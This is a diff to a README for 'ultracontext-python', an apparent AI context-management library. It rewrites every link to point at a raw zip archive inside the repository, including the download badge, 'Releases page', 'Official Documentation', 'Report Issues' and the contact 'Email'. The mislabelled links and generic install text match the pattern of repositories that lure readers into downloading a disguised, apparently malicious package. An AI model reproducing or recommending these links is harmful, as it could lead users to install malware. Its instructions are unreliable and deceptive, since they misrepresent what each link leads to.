@@ -1,6 +1,6 @@
 # 🚀 ultracontext-python - Simplifying AI Context Management
 
-[![Download ultracontext-python](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip)](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip)
+[![Download ultracontext-python](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip)](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Before you start, make sure your system meets the following requirements:
 To get started with ultracontext-python, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip) to find the latest version.
 
 2. **Download the Latest Version**
    Select the latest release version, and click on the download link. This will get you the required installation files.
@@ -39,7 +39,7 @@ To get started with ultracontext-python, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download, visit this page: [Download ultracontext-python](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip).
+To download, visit this page: [Download ultracontext-python](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip).
 
 ### Installation Steps
 
@@ -59,7 +59,7 @@ To download, visit this page: [Download ultracontext-python](https://github.com/
 
 To learn more about how to use ultracontext-python:
 
-- Explore the [Official Documentation](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip).
+- Explore the [Official Documentation](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip).
 - Check out examples and tutorials available in the Wiki section for practical insights.
 
 ## ❓ Troubleshooting
@@ -84,13 +84,13 @@ Your input can help enhance this project for everyone.
 
 Join our community for support, discussions, and updates. You can connect with other users on:
 
-- GitHub Issues: [Report Issues](https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip)
+- GitHub Issues: [Report Issues](https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip)
 - Community Forum: Participate in discussions and share your experiences.
 
 ## 📧 Contact
 
 If you have questions or need further assistance, feel free to reach out:
 
-- Email: https://github.com/PUCHO1998/ultracontext-python/raw/refs/heads/main/ultracontext/python_ultracontext_v1.1.zip 
+- Email: https://raw.githubusercontent.com/PUCHO1998/ultracontext-python/main/ultracontext/ultracontext_python_v1.2.zip 
 
 Thank you for choosing ultracontext-python! We hope it enhances your AI applications.
